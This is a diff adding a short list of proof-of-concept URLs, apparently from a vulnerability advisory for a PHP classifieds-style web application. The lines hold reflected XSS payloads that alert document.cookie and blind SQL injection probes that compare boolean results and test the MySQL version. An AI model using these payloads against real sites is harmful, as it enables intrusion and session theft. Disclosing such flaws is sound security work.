@@ -1,0 +1,8 @@
+http://www.example.com/pro/gmap.php?addr=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/wap/index.php?md=browse&amp;ct=manw&amp;city=Akron%20OH&amp;page=1&lt;script&gt;alert(317158806252)&lt;/script&gt;
+http://www.example.com/clnt/index.php?ct=manw_repl&amp;md=add_form&amp;replid=11438   and 1=1 &lt;= TRUE
+http://www.example.com/clnt/index.php?ct=manw_repl&amp;md=add_form&amp;replid=11438   and 1=2 &lt;= FALSE
+http://www.example.com/clnt/index.php?ct=manw_repl&amp;md=add_form&amp;replid=11438+AND SUBSTRING(@@version,1,1)=5=&gt; TRUE
+http://www.example.com/clnt/index.php?ct=manw_repl&amp;md=add_form&amp;replid=11438+AND SUBSTRING(@@version,1,1)=5=&gt; FALSE
+http://www.example.com/clnt/index.php?ct=evntcl&amp;md=browse&amp;mds=search&amp;adsordtp=vote&amp;city=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;page=2
+
